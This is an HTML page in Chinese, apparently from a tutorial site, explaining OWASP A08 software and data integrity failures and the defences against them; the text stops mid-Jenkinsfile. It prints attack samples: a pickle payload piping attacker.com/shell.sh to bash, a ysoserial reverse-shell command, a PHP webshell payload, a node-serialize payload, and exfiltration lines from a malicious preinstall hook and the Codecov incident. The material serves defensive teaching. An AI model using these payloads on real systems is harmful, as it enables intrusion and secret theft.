@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>A08: 软件和数据完整性失效 - OWASP Top 10</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page-wrapper">
+  <nav class="sidebar">
+    <h2>OWASP Top 10</h2>
+    <ul>
+      <li><a href="A01_权限控制失效.html">A01: 权限控制失效</a></li>
+      <li><a href="A02_加密机制失效.html">A02: 加密机制失效</a></li>
+      <li><a href="A03_注入攻击.html">A03: 注入攻击</a></li>
+      <li><a href="A04_不安全设计.html">A04: 不安全设计</a></li>
+      <li><a href="A05_安全配置错误.html">A05: 安全配置错误</a></li>
+      <li><a href="A06_过时组件.html">A06: 过时组件</a></li>
+      <li><a href="A07_认证失效.html">A07: 认证失效</a></li>
+      <li><a href="A08_软件完整性失效.html" class="active">A08: 软件完整性失效</a></li>
+      <li><a href="A09_日志监控失效.html">A09: 日志监控失效</a></li>
+      <li><a href="A10_SSRF.html">A10: SSRF</a></li>
+    </ul>
+    <h2>本页目录</h2>
+    <ul>
+      <li><a href="#overview">概述</a></li>
+      <li><a href="#deserialization">不安全的反序列化</a></li>
+      <li><a href="#attack-examples">攻击示例</a></li>
+      <li><a href="#cicd-attacks">CI/CD 流水线攻击</a></li>
+      <li><a href="#unsigned-updates">未签名的软件更新</a></li>
+      <li><a href="#sri">子资源完整性 (SRI)</a></li>
+      <li><a href="#supply-chain">供应链攻击案例</a></li>
+      <li><a href="#defense">防御方案</a></li>
+    </ul>
+    <h2>导航</h2>
+    <ul>
+      <li><a href="../index.html">返回首页</a></li>
+    </ul>
+  </nav>
+
+  <main class="main-content">
+    <div class="breadcrumb">
+      <a href="../index.html">首页</a> / <a href="A01_权限控制失效.html">OWASP Top 10</a> / A08: 软件完整性失效
+    </div>
+
+    <h1>A08:2021 - 软件和数据完整性失效</h1>
+    <p><span class="tag high">HIGH</span> <span class="tag">排名第8</span></p>
+    <p>Software and Data Integrity Failures（软件和数据完整性失效）关注的是代码和基础设施在未验证完整性的情况下被信任执行的问题。当应用依赖不受信任的来源（插件、库、CDN）而不做完整性验证时，攻击者可以注入恶意代码，影响整个软件供应链。</p>
+
+    <div class="info-box note">
+      <div class="box-title">2021 年新变化</div>
+      <p>A08 在 2021 版本中是新增类别，合并了原来的 <strong>A08:2017 不安全的反序列化</strong> 并扩展为更广泛的软件完整性概念。新增了 CI/CD 流水线安全、供应链攻击、代码签名等内容。</p>
+      <p>近年来 SolarWinds、Codecov、Log4Shell 等事件表明，供应链攻击已成为最严重的安全威胁之一。</p>
+    </div>
+
+    <!-- Section 1: 概述 -->
+    <h2 id="overview">1. 概述</h2>
+
+    <h3>1.1 什么是软件完整性失效</h3>
+    <p>软件完整性失效发生在以下场景：</p>
+    <ul>
+      <li>应用程序依赖来自不受信任来源的插件、库或模块</li>
+      <li>CI/CD 流水线缺少完整性验证，允许未授权代码进入生产环境</li>
+      <li>自动更新功能在未验证签名的情况下下载并安装更新</li>
+      <li>对象或数据被序列化后通过不受信任的通道传输而未验证</li>
+    </ul>
+
+    <h3>1.2 CI/CD 流水线信任问题</h3>
+    <div class="diagram">软件供应链信任模型：
+
+┌─────────────────────────────────────────────────────────────────────┐
+│                        软件供应链攻击面                                │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  开发阶段           构建阶段            分发阶段          运行阶段     │
+│  ┌───────┐        ┌───────┐         ┌───────┐        ┌───────┐    │
+│  │ IDE   │───────▶│ Build │────────▶│ Repo  │───────▶│ Prod  │    │
+│  │ 代码  │        │ Server│         │ CDN   │        │ Server│    │
+│  └───┬───┘        └───┬───┘         └───┬───┘        └───┬───┘    │
+│      │                 │                  │                │        │
+│      ▼                 ▼                  ▼                ▼        │
+│  ┌───────┐        ┌───────┐         ┌───────┐        ┌───────┐    │
+│  │恶意   │        │篡改构 │         │替换二 │        │运行时 │    │
+│  │依赖   │        │建脚本 │         │进制文 │        │反序列 │    │
+│  │注入   │        │注入后 │         │件/包  │        │化攻击 │    │
+│  │       │        │门     │         │       │        │       │    │
+│  └───────┘        └───────┘         └───────┘        └───────┘    │
+│                                                                     │
+│  攻击向量: Typosquatting  构建服务器沦陷   CDN劫持    Gadget Chain   │
+│           依赖混淆        Pipeline注入     中间人攻击  Magic Methods  │
+│           恶意PR          Secret泄露       未签名更新  Pickle/YAML    │
+└─────────────────────────────────────────────────────────────────────┘</div>
+
+    <h3>1.3 影响数据</h3>
+    <table>
+      <thead><tr><th>指标</th><th>数值</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td>CWE 映射数</td><td>10</td><td>包含 CWE-502, CWE-829 等</td></tr>
+        <tr><td>最大发生率</td><td>16.67%</td><td>在被测应用中的占比</td></tr>
+        <tr><td>平均发生率</td><td>2.05%</td><td>跨所有组织的平均值</td></tr>
+        <tr><td>平均利用加权</td><td>6.94</td><td>可利用性评分</td></tr>
+        <tr><td>平均影响加权</td><td>7.94</td><td>影响程度评分</td></tr>
+        <tr><td>供应链攻击年增长</td><td>742%</td><td>2020-2021年期间（Sonatype报告）</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 2: 不安全的反序列化 -->
+    <h2 id="deserialization">2. 不安全的反序列化</h2>
+
+    <h3>2.1 反序列化基本原理</h3>
+    <p>序列化是将对象转换为字节流（用于存储或传输），反序列化是其逆过程。当应用程序反序列化来自不受信任来源的数据时，攻击者可以操控序列化数据来执行任意代码、发起拒绝服务攻击或绕过认证。</p>
+
+    <div class="diagram">反序列化攻击原理：
+
+┌──────────┐    序列化      ┌──────────────┐    网络传输     ┌──────────┐
+│  Object  │──────────────▶│  Byte Stream │──────────────▶│ 攻击者   │
+│  (服务端) │               │  (可被篡改)   │               │ 篡改数据 │
+└──────────┘               └──────────────┘               └────┬─────┘
+                                                               │
+     ┌──────────┐    反序列化    ┌──────────────┐              │
+     │ RCE!!!   │◀─────────────│ 恶意 Payload │◀─────────────┘
+     │ 服务器   │               │ (Gadget Chain)│
+     └──────────┘               └──────────────┘
+
+关键点：反序列化过程中自动调用的方法（如 Java 的 readObject()、
+Python 的 __reduce__()、PHP 的 __wakeup()）可被利用执行任意代码。</div>
+
+    <h3>2.2 Java 反序列化 (ObjectInputStream)</h3>
+    <p>Java 反序列化漏洞是最严重的一类，因为 Java 拥有丰富的 "Gadget Chain"（小工具链），允许攻击者通过精心构造的序列化对象实现远程代码执行（RCE）。</p>
+
+    <div class="info-box warning">
+      <div class="box-title">危险：Java ObjectInputStream</div>
+      <p>永远不要对不受信任的数据使用 <code>ObjectInputStream.readObject()</code>。常见的可利用库包括：Apache Commons Collections、Spring Framework、Groovy、Apache Commons BeanUtils 等。</p>
+    </div>
+
+    <pre><code>// ❌ 危险示例：直接反序列化用户输入
+import java.io.*;
+
+public class VulnerableEndpoint {
+    public Object deserialize(byte[] data) throws Exception {
+        ByteArrayInputStream bais = new ByteArrayInputStream(data);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        // 危险！攻击者控制的数据被直接反序列化
+        return ois.readObject();
+    }
+}
+
+// 攻击者利用 Apache Commons Collections Gadget Chain：
+// 使用 ysoserial 工具生成 payload
+// $ java -jar ysoserial.jar CommonsCollections1 'calc.exe' | base64
+
+// ✅ 安全替代方案：使用白名单过滤
+import org.apache.commons.io.serialization.ValidatingObjectInputStream;
+
+public class SafeEndpoint {
+    public Object deserialize(byte[] data) throws Exception {
+        ByteArrayInputStream bais = new ByteArrayInputStream(data);
+        ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bais);
+        // 只允许特定的安全类被反序列化
+        ois.accept(AllowedClass1.class, AllowedClass2.class);
+        ois.accept("java.lang.*", "java.util.*");
+        return ois.readObject();
+    }
+}</code></pre>
+
+    <h3>2.3 Python 反序列化 (pickle)</h3>
+    <p>Python 的 <code>pickle</code> 模块在反序列化时会执行 <code>__reduce__()</code> 方法返回的可调用对象，这使得攻击者可以执行任意系统命令。</p>
+
+    <pre><code># ❌ 危险示例：使用 pickle 反序列化用户数据
+import pickle
+import base64
+
+# 服务端代码 - 从 Cookie/请求中读取序列化数据
+def load_session(cookie_data):
+    data = base64.b64decode(cookie_data)
+    return pickle.loads(data)  # 危险！
+
+# 攻击者构造恶意 payload
+import os
+
+class MaliciousPayload:
+    def __reduce__(self):
+        # 反序列化时自动执行
+        return (os.system, ('curl attacker.com/shell.sh | bash',))
+
+# 生成恶意 Cookie
+payload = pickle.dumps(MaliciousPayload())
+evil_cookie = base64.b64encode(payload).decode()
+print(f"恶意Cookie: {evil_cookie}")
+
+# ✅ 安全替代方案
+import json
+import hmac
+import hashlib
+
+SECRET_KEY = b'your-secret-key-here'
+
+def safe_save_session(session_data):
+    """使用 JSON + HMAC 签名"""
+    data = json.dumps(session_data).encode()
+    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
+    return base64.b64encode(data).decode() + '.' + signature
+
+def safe_load_session(signed_data):
+    """验证签名后再解析"""
+    parts = signed_data.split('.')
+    if len(parts) != 2:
+        raise ValueError("Invalid session format")
+    data_b64, signature = parts
+    data = base64.b64decode(data_b64)
+    expected_sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
+    if not hmac.compare_digest(signature, expected_sig):
+        raise ValueError("Session signature verification failed")
+    return json.loads(data)</code></pre>
+
+    <h3>2.4 PHP 反序列化 (unserialize)</h3>
+    <p>PHP 的 <code>unserialize()</code> 函数在对象重建时会自动调用魔术方法（<code>__wakeup()</code>、<code>__destruct()</code>），攻击者可通过 POP Chain（Property Oriented Programming）实现代码执行。</p>
+
+    <pre><code>// ❌ 危险示例：PHP 反序列化
+&lt;?php
+// 从用户请求中读取序列化数据
+$data = $_COOKIE['session_data'];
+$obj = unserialize($data);  // 危险！
+
+// 可利用的类（Gadget）
+class FileHandler {
+    public $filename;
+    public $content;
+
+    public function __destruct() {
+        // 对象销毁时自动调用
+        file_put_contents($this->filename, $this->content);
+    }
+}
+
+// 攻击者构造 payload 写入 webshell：
+// O:11:"FileHandler":2:{s:8:"filename";s:18:"/var/www/shell.php";
+//   s:7:"content";s:30:"&lt;?php system($_GET['cmd']); ?&gt;";}
+
+// ✅ 安全替代方案
+// 1. 使用 JSON 代替 serialize
+$session = json_decode($cookie_data, true);
+
+// 2. 如果必须使用 unserialize，限制允许的类
+$obj = unserialize($data, ['allowed_classes' =&gt; ['SafeClass1', 'SafeClass2']]);
+
+// 3. 使用 HMAC 验证数据完整性
+$payload = base64_decode($data);
+$signature = hash_hmac('sha256', $payload, $secret_key);
+if (!hash_equals($expected_signature, $signature)) {
+    die('数据被篡改');
+}
+?&gt;</code></pre>
+
+    <h3>2.5 .NET 反序列化</h3>
+    <pre><code>// ❌ 危险示例：.NET BinaryFormatter
+using System.Runtime.Serialization.Formatters.Binary;
+
+public object DeserializeData(byte[] data) {
+    var formatter = new BinaryFormatter();  // 已标记为过时且危险
+    using (var stream = new MemoryStream(data)) {
+        return formatter.Deserialize(stream);  // RCE 风险
+    }
+}
+
+// ✅ 安全替代方案：使用 System.Text.Json
+using System.Text.Json;
+
+public T SafeDeserialize&lt;T&gt;(string json) {
+    var options = new JsonSerializerOptions {
+        PropertyNameCaseInsensitive = true,
+        // 不允许注释和尾随逗号以减少攻击面
+        ReadCommentHandling = JsonCommentHandling.Disallow,
+        AllowTrailingCommas = false
+    };
+    return JsonSerializer.Deserialize&lt;T&gt;(json, options);
+}</code></pre>
+
+    <!-- Section 3: 攻击示例 -->
+    <h2 id="attack-examples">3. 攻击示例</h2>
+
+    <h3>3.1 利用 Java 反序列化获取 Shell</h3>
+    <pre><code># 使用 ysoserial 生成反弹 Shell payload
+$ java -jar ysoserial.jar CommonsCollections5 \
+    'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDMgMD4mMQ==}|{base64,-d}|{bash,-i}' \
+    &gt; payload.bin
+
+# Base64 编码后发送到目标端点
+$ cat payload.bin | base64 -w0 | curl -X POST \
+    -H "Content-Type: application/x-java-serialized-object" \
+    --data-binary @- \
+    http://target.com/api/session
+
+# 检测序列化数据的特征：
+# Java:   以 "AC ED 00 05" (hex) 或 "rO0AB" (base64) 开头
+# .NET:   以 "AAEAAAD" (base64) 开头
+# PHP:    以 "O:" 或 "a:" 等类型标识开头
+# Python: pickle 以 opcode 字节开头 (0x80 为 protocol 标识)</code></pre>
+
+    <h3>3.2 Node.js node-serialize 漏洞 (CVE-2017-5941)</h3>
+    <pre><code>// node-serialize 库允许序列化/反序列化包含函数的对象
+// 攻击者可注入立即执行函数 (IIFE)
+
+var serialize = require('node-serialize');
+
+// 恶意 payload - 函数会在反序列化时立即执行
+var payload = '{"exploit":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id &gt; /tmp/pwned\',function(error,stdout,stderr){});}()"}';
+
+// 当服务器反序列化此数据时，命令被执行
+serialize.unserialize(payload);
+
+// 真实攻击场景：payload 通常放在 Cookie 中
+// Cookie: profile=eyJleHBsb2l0IjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7Li4ufSgpIn0=</code></pre>
+
+    <h3>3.3 各语言反序列化对比</h3>
+    <table>
+      <thead><tr><th>语言</th><th>危险函数/类</th><th>魔术方法</th><th>工具</th><th>安全替代</th></tr></thead>
+      <tbody>
+        <tr><td>Java</td><td>ObjectInputStream</td><td>readObject(), readResolve()</td><td>ysoserial</td><td>JSON, Protocol Buffers</td></tr>
+        <tr><td>Python</td><td>pickle, PyYAML</td><td>__reduce__(), __setstate__()</td><td>自定义脚本</td><td>json, yaml.safe_load()</td></tr>
+        <tr><td>PHP</td><td>unserialize()</td><td>__wakeup(), __destruct()</td><td>PHPGGC</td><td>json_decode()</td></tr>
+        <tr><td>.NET</td><td>BinaryFormatter</td><td>ISerializable, OnDeserialized</td><td>ysoserial.net</td><td>System.Text.Json</td></tr>
+        <tr><td>Ruby</td><td>Marshal.load()</td><td>marshal_load()</td><td>自定义</td><td>JSON.parse()</td></tr>
+        <tr><td>Node.js</td><td>node-serialize</td><td>IIFE 执行</td><td>自定义</td><td>JSON.parse()</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 4: CI/CD 流水线攻击 -->
+    <h2 id="cicd-attacks">4. CI/CD 流水线攻击</h2>
+
+    <h3>4.1 构建服务器沦陷</h3>
+    <p>CI/CD 服务器（Jenkins、GitLab CI、GitHub Actions）通常拥有生产环境的部署权限和各种 Secrets。一旦构建服务器被入侵，攻击者可以：</p>
+    <ul>
+      <li>在构建过程中注入后门代码</li>
+      <li>窃取部署凭证和 API Keys</li>
+      <li>修改构建产物（编译后的二进制文件）</li>
+      <li>植入持久化访问机制</li>
+    </ul>
+
+    <div class="diagram">CI/CD 流水线攻击路径：
+
+┌─────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
+│开发者    │────▶│  Git     │────▶│  CI/CD   │────▶│  生产    │
+│提交代码  │     │  仓库    │     │  Server  │     │  环境    │
+└─────────┘     └──────────┘     └──────────┘     └──────────┘
+                      │                │                 │
+              ┌───────┴───────┐  ┌────┴─────┐    ┌─────┴─────┐
+              │  攻击向量:    │  │ 攻击向量: │    │ 攻击向量: │
+              │               │  │           │    │           │
+              │ • 恶意PR      │  │ • 配置篡改│    │ • 后门部署│
+              │ • 提交钩子    │  │ • Secret  │    │ • 恶意镜像│
+              │ • 依赖混淆    │  │   泄露    │    │ • 配置覆盖│
+              │ • .github/    │  │ • Runner  │    │           │
+              │   workflows   │  │   逃逸    │    │           │
+              └───────────────┘  └───────────┘    └───────────┘</div>
+
+    <h3>4.2 恶意依赖注入</h3>
+    <pre><code># 依赖混淆攻击 (Dependency Confusion)
+# 攻击者在公共仓库发布与内部包同名的恶意包（更高版本号）
+
+# 示例 package.json - 内部包 @company/utils
+{
+  "name": "victim-app",
+  "dependencies": {
+    "@company/utils": "^1.0.0"
+  }
+}
+
+# 攻击者在 npmjs.com 发布：
+# 包名: @company/utils (如果 scope 未被注册)
+# 或者: company-utils (相似名称)
+# 版本: 99.0.0 (高版本号，触发自动升级)
+
+# 恶意包的 package.json
+{
+  "name": "company-utils",
+  "version": "99.0.0",
+  "scripts": {
+    "preinstall": "curl https://attacker.com/collect?host=$(hostname)&amp;user=$(whoami)"
+  }
+}
+
+# 防御：在 .npmrc 中固定 registry
+@company:registry=https://private.registry.company.com
+# 使用 package-lock.json 锁定精确版本</code></pre>
+
+    <h3>4.3 Typosquatting（域名/包名抢注）</h3>
+    <table>
+      <thead><tr><th>合法包名</th><th>恶意仿冒包名</th><th>攻击手法</th></tr></thead>
+      <tbody>
+        <tr><td>lodash</td><td>lodahs, l0dash, lodash-utils</td><td>拼写错误/数字替换</td></tr>
+        <tr><td>requests (Python)</td><td>request, python-requests</td><td>缺少/添加复数</td></tr>
+        <tr><td>colors</td><td>colours, color</td><td>英式/美式拼写差异</td></tr>
+        <tr><td>electron</td><td>electorn, eIectron</td><td>字母顺序/视觉混淆</td></tr>
+        <tr><td>cross-env</td><td>crossenv, cross-env.js</td><td>连字符变化</td></tr>
+      </tbody>
+    </table>
+
+    <h3>4.4 GitHub Actions 安全风险</h3>
+    <pre><code># ❌ 危险：使用可变标签引用第三方 Action
+name: Build
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3  # 标签可被覆盖！
+      - uses: some-user/some-action@main  # 分支引用，随时可变
+
+# ✅ 安全：使用 commit SHA 固定版本
+name: Build
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab  # v3.5.2
+      - uses: some-user/some-action@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0
+
+# 额外安全措施：限制 GITHUB_TOKEN 权限
+permissions:
+  contents: read
+  packages: read</code></pre>
+
+    <!-- Section 5: 未签名软件更新 -->
+    <h2 id="unsigned-updates">5. 未签名的软件更新</h2>
+
+    <h3>5.1 不安全的自动更新流程</h3>
+    <div class="info-box warning">
+      <div class="box-title">典型漏洞场景</div>
+      <p>许多应用通过 HTTP（非 HTTPS）检查更新，或虽使用 HTTPS 但不验证下载文件的数字签名。中间人攻击者可替换更新包为恶意程序，在用户毫不知情的情况下获得代码执行权限。</p>
+    </div>
+
+    <pre><code># ❌ 不安全的更新检查（伪代码）
+def check_update():
+    # 问题1: 使用 HTTP，可被中间人劫持
+    response = requests.get("http://updates.example.com/latest.json")
+    update_info = response.json()
+
+    if update_info['version'] &gt; CURRENT_VERSION:
+        # 问题2: 下载后不验证签名
+        binary = requests.get(update_info['download_url']).content
+        # 问题3: 直接执行下载的文件
+        with open('/tmp/update.bin', 'wb') as f:
+            f.write(binary)
+        os.chmod('/tmp/update.bin', 0o755)
+        os.execv('/tmp/update.bin', [])
+
+# ✅ 安全的更新流程
+import hashlib
+from cryptography.hazmat.primitives.asymmetric import padding, utils
+from cryptography.hazmat.primitives import hashes
+from cryptography.x509 import load_pem_x509_certificate
+
+def secure_update():
+    # 1. 使用 HTTPS + 证书固定
+    response = requests.get(
+        "https://updates.example.com/latest.json",
+        verify='/path/to/pinned-ca.pem'
+    )
+    update_info = response.json()
+
+    if update_info['version'] &gt; CURRENT_VERSION:
+        # 2. 下载更新和签名
+        binary = requests.get(update_info['download_url'], verify=True).content
+        signature = bytes.fromhex(update_info['signature'])
+
+        # 3. 验证哈希
+        expected_hash = update_info['sha256']
+        actual_hash = hashlib.sha256(binary).hexdigest()
+        if actual_hash != expected_hash:
+            raise SecurityError("Hash mismatch - file tampered")
+
+        # 4. 验证数字签名（使用内置的公钥）
+        with open('update_public_key.pem', 'rb') as f:
+            cert = load_pem_x509_certificate(f.read())
+        public_key = cert.public_key()
+        public_key.verify(
+            signature,
+            binary,
+            padding.PSS(
+                mgf=padding.MGF1(hashes.SHA256()),
+                salt_length=padding.PSS.MAX_LENGTH
+            ),
+            hashes.SHA256()
+        )
+
+        # 5. 验证通过，安全安装
+        install_update(binary)</code></pre>
+
+    <!-- Section 6: SRI -->
+    <h2 id="sri">6. 子资源完整性 (SRI)</h2>
+
+    <h3>6.1 SRI 工作原理</h3>
+    <p>Subresource Integrity（SRI）允许浏览器验证从 CDN 加载的资源是否被篡改。通过在 <code>&lt;script&gt;</code> 或 <code>&lt;link&gt;</code> 标签中添加 <code>integrity</code> 属性，浏览器会比较下载内容的哈希值与预期值。</p>
+
+    <div class="diagram">SRI 验证流程：
+
+浏览器                              CDN
+  │                                   │
+  │  1. 请求 jquery.min.js            │
+  │──────────────────────────────────▶│
+  │                                   │
+  │  2. 返回文件内容                   │
+  │◀──────────────────────────────────│
+  │                                   │
+  │  3. 计算 SHA-384 哈希              │
+  │  ┌─────────────────────────┐      │
+  │  │ SHA384(文件内容)         │      │
+  │  │ = "oqVuAfXRKap7fdgcCY5..."│     │
+  │  └─────────────────────────┘      │
+  │                                   │
+  │  4. 与 integrity 属性比较          │
+  │  ┌─────────────────────────┐      │
+  │  │ 匹配 ──▶ 执行脚本       │      │
+  │  │ 不匹配 ──▶ 拒绝加载     │      │
+  │  └─────────────────────────┘      │
+  │                                   │</div>
+
+    <h3>6.2 SRI 使用示例</h3>
+    <pre><code>&lt;!-- ❌ 不安全：未使用 SRI --&gt;
+&lt;script src="https://cdn.example.com/jquery-3.6.0.min.js"&gt;&lt;/script&gt;
+&lt;link rel="stylesheet" href="https://cdn.example.com/bootstrap.min.css"&gt;
+
+&lt;!-- ✅ 安全：使用 SRI + crossorigin --&gt;
+&lt;script
+  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"
+  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
+  crossorigin="anonymous"&gt;
+&lt;/script&gt;
+
+&lt;link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
+  integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"
+  crossorigin="anonymous"&gt;
+
+&lt;!-- 生成 SRI 哈希的命令 --&gt;
+&lt;!-- $ cat jquery.min.js | openssl dgst -sha384 -binary | openssl base64 -A --&gt;
+&lt;!-- $ shasum -b -a 384 jquery.min.js | awk '{print $1}' | xxd -r -p | base64 --&gt;</code></pre>
+
+    <h3>6.3 Content Security Policy 配合 SRI</h3>
+    <pre><code># 通过 CSP 强制要求所有脚本使用 SRI
+Content-Security-Policy: require-sri-for script style;
+
+# 或者在 HTML meta 标签中设置
+&lt;meta http-equiv="Content-Security-Policy"
+      content="require-sri-for script style"&gt;</code></pre>
+
+    <div class="info-box note">
+      <div class="box-title">SRI 限制与注意事项</div>
+      <p><strong>动态资源：</strong>SRI 不适用于经常变化的资源（如 API 响应），因为每次内容变化都需要更新哈希值。</p>
+      <p><strong>crossorigin 属性：</strong>使用 SRI 时必须添加 <code>crossorigin="anonymous"</code>，否则浏览器无法进行 CORS 校验。</p>
+      <p><strong>CDN 版本：</strong>始终引用带版本号的资源 URL（如 jquery@3.6.0），避免使用 "latest" 等浮动引用。</p>
+    </div>
+
+    <!-- Section 7: 供应链攻击案例 -->
+    <h2 id="supply-chain">7. 供应链攻击案例</h2>
+
+    <h3>7.1 SolarWinds 事件 (2020)</h3>
+    <table>
+      <thead><tr><th>阶段</th><th>攻击者动作</th><th>影响</th></tr></thead>
+      <tbody>
+        <tr><td>入侵</td><td>攻击者渗透 SolarWinds 构建环境</td><td>获取构建流水线访问权</td></tr>
+        <tr><td>植入</td><td>在 Orion 产品源码中注入 SUNBURST 后门</td><td>后门代码被编译进合法产品</td></tr>
+        <tr><td>签名</td><td>恶意代码随正常构建流程被合法签名</td><td>绕过所有代码签名检测</td></tr>
+        <tr><td>分发</td><td>通过官方更新渠道推送到客户</td><td>约 18,000 组织安装了带后门的更新</td></tr>
+        <tr><td>激活</td><td>后门休眠 2 周后与 C2 服务器通信</td><td>美国政府、微软等高价值目标被入侵</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box warning">
+      <div class="box-title">SolarWinds 事件教训</div>
+      <p>这次攻击证明：即使有代码签名和安全的分发渠道，如果构建环境本身被入侵，所有安全机制都会被绕过。构建环境的安全性与生产环境同等重要。</p>
+    </div>
+
+    <h3>7.2 Codecov Bash Uploader 事件 (2021)</h3>
+    <pre><code># Codecov 的 Bash 上传脚本被篡改
+# 原始安全用法：
+# $ bash &lt;(curl -s https://codecov.io/bash)
+
+# 攻击者修改了 codecov.io 上的 bash 脚本
+# 注入了以下恶意代码：
+curl -sm 0.5 -d "$(git remote -v)&lt;&lt;&lt;&lt;&lt;&lt; ENV $(env)" \
+    http://attacker-server.com/upload/v2 || true
+
+# 影响：所有在 CI 中使用该脚本的项目的环境变量
+# （包括 tokens、API keys）都被发送到攻击者服务器
+
+# 持续时间：2021年1月31日 - 2021年4月1日（约2个月未被发现）
+
+# 防御措施：
+# 1. 固定脚本版本并验证哈希
+EXPECTED_SHA="d6aa3207c4908d123bd8af62ec0538e3f2b9f257"
+curl -s https://codecov.io/bash &gt; codecov.sh
+echo "$EXPECTED_SHA codecov.sh" | sha1sum -c -
+bash codecov.sh</code></pre>
+
+    <h3>7.3 event-stream 事件 (2018)</h3>
+    <pre><code>// NPM 包 event-stream（每周 200 万次下载）被注入恶意代码
+// 攻击者：获得维护权限后添加恶意依赖 flatmap-stream
+
+// 恶意代码经过混淆，目标是窃取 Copay 比特币钱包的私钥
+// 攻击链：
+// event-stream@3.3.6 -&gt; flatmap-stream@0.1.1 (恶意代码)
+
+// 恶意代码仅针对特定目标（Copay钱包）激活：
+module.exports = function(e) {
+    try {
+        // 检测是否是目标应用
+        if (e.description &amp;&amp; e.description.includes("copay")) {
+            // 窃取钱包密钥并发送到攻击者服务器
+            steal_keys(e);
+        }
+    } catch(e) {}
+}
+
+// 教训：
+// 1. 开源维护者倦怠可能导致供应链风险
+// 2. 传递依赖同样需要安全审计
+// 3. 代码混淆应作为可疑信号</code></pre>
+
+    <h3>7.4 主要供应链攻击汇总</h3>
+    <table>
+      <thead><tr><th>事件</th><th>年份</th><th>攻击方式</th><th>影响范围</th><th>潜伏时间</th></tr></thead>
+      <tbody>
+        <tr><td>SolarWinds</td><td>2020</td><td>构建环境入侵</td><td>~18,000 组织</td><td>~14 个月</td></tr>
+        <tr><td>Codecov</td><td>2021</td><td>CI 脚本篡改</td><td>数千个 CI 环境</td><td>~2 个月</td></tr>
+        <tr><td>event-stream</td><td>2018</td><td>维护权转让+恶意依赖</td><td>目标 Copay 钱包</td><td>~2 个月</td></tr>
+        <tr><td>ua-parser-js</td><td>2021</td><td>NPM 账号劫持</td><td>周下载量 700万+</td><td>数小时</td></tr>
+        <tr><td>Log4Shell</td><td>2021</td><td>核心库 0day</td><td>全球 Java 应用</td><td>8+ 年（漏洞存在时间）</td></tr>
+        <tr><td>3CX</td><td>2023</td><td>连锁供应链攻击</td><td>60 万+ 企业客户</td><td>数周</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 8: 防御方案 -->
+    <h2 id="defense">8. 防御方案</h2>
+
+    <h3>8.1 代码签名</h3>
+    <pre><code># GPG 签名 Git 提交
+$ git config --global commit.gpgsign true
+$ git config --global user.signingkey YOUR_KEY_ID
+
+# 验证签名
+$ git log --show-signature
+
+# 签名软件发布包
+$ gpg --armor --detach-sign release-v1.0.tar.gz
+# 生成 release-v1.0.tar.gz.asc
+
+# 用户验证签名
+$ gpg --verify release-v1.0.tar.gz.asc release-v1.0.tar.gz
+
+# Docker 镜像签名 (cosign)
+$ cosign sign --key cosign.key myregistry.io/myapp:v1.0
+$ cosign verify --key cosign.pub myregistry.io/myapp:v1.0</code></pre>
+
+    <h3>8.2 依赖固定与锁定</h3>
+    <pre><code># NPM: 使用 package-lock.json + npm ci
+$ npm ci  # 严格按照 lock 文件安装，不更新
+
+# Python: 使用 pip freeze + hash 验证
+$ pip install --require-hashes -r requirements.txt
+
+# requirements.txt 带哈希：
+Flask==2.2.3 \
+    --hash=sha256:abc123... \
+    --hash=sha256:def456...
+
+# Go: go.sum 文件自动进行哈希验证
+# Rust: Cargo.lock 固定精确版本
+
+# .npmrc 配置安全策略
+engine-strict=true
+ignore-scripts=true        # 禁止 postinstall 脚本
+audit-level=moderate       # 自动审计</code></pre>
+
+    <h3>8.3 SBOM（软件物料清单）</h3>
+    <div class="info-box note">
+      <div class="box-title">什么是 SBOM</div>
+      <p>Software Bill of Materials (SBOM) 是软件组件的正式记录，列出所有使用的库、框架及其版本。类似于食品的成分表，SBOM 让用户了解软件中包含哪些组件，便于在漏洞披露时快速评估影响。</p>
+      <p>2021年美国行政命令要求向联邦政府销售软件的供应商必须提供 SBOM。</p>
+    </div>
+
+    <pre><code># 生成 SBOM (CycloneDX 格式)
+$ npm install -g @cyclonedx/cyclonedx-npm
+$ cyclonedx-npm --output sbom.json
+
+# 使用 syft 生成容器镜像的 SBOM
+$ syft myapp:latest -o cyclonedx-json &gt; sbom.json
+
+# 使用 grype 扫描 SBOM 中的已知漏洞
+$ grype sbom:sbom.json
+
+# SBOM 标准格式：
+# - CycloneDX (OWASP 项目)
+# - SPDX (Linux Foundation)
+# - SWID Tags (ISO/IEC 19770-2)</code></pre>
+
+    <h3>8.4 CI/CD 流水线加固</h3>
+    <pre><code># Jenkinsfile 安全最佳实践
+pipeline {
+    agent {
+        docker {
+            image 'build-env:pinned-sha256@sha256:abc123...'
+            // 使用不可变的镜像摘要
+        }
+    }
+    options {
